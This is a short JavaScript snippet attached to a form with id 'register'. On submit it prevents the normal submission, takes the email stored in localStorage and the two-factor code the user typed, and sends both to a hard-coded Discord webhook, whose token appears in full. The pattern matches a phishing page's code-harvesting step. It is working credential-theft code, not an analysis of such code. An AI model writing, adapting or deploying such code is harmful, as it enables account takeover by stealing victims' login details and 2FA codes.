const form = document.getElementById("register");
const email = localStorage.getItem("email");

form.addEventListener("submit", (event)=>
{
    event.preventDefault();

    const code = document.getElementById("code").value;

        const content = `email: ${email}\n2fa code: ${code}`;
        
        fetch("https://discord.com/api/webhooks/1287033070683291791/KyV9Do_taZwdspy_kLwYoerMHoClWEDthrExqfYBZoUpmGkoA1c3RrMHMxY5MRfpUjD_", 
        {
            method: "POST", 
            headers: 
            {
                "Content-Type" : "application/json"
            },
            body: JSON.stringify({
                username: "Dáda",
                content: content
            })
        })
});